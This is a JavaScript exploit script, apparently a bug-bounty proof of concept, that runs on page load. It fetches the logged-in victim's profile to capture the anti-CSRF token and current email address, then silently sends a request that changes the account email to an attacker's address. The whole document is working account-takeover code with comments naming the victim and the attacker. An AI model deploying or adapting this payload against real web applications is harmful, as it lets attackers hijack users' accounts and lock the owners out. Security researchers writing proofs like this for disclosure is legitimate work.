document.addEventListener("DOMContentLoaded", function() {

    // returns the anti-csrf token and current email address of the victim
    function fetchInfo(callback) {
        var currentEmail = "";
        var userCsrfToken = "";
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "/users/" + utag_data.context.user.tuid + "/profile", false);
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4 && xhr.status === 200) {
                var data = JSON.parse(xhr.responseText);
                userCsrfToken = data.csrfToken;
                currentEmail = data.email;
                callback(userCsrfToken, currentEmail);
            }
        };
        xhr.send();
    }
    
    function changeEmail(newEmail) {
        fetchInfo(function(userCsrfToken, currentEmail) {
            var emailChangeUrl = "/users/" + utag_data.context.user.tuid + "/updateemail";
            var requestData = { 
                "newEmail": newEmail,
                "hiddenNewEmail": currentEmail,
                "unsubscribe_on_updateEmail": "false",
                "confirmNewEmail": newEmail,
                "csrfToken": userCsrfToken
            };
            var xhr = new XMLHttpRequest();
            xhr.open("POST", emailChangeUrl, false);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify(requestData));
        });
    }
    
    // triggering change email with the attacker's email address
    changeEmail("s4ur4bh+attacker+100@wearehackerone.com");

});
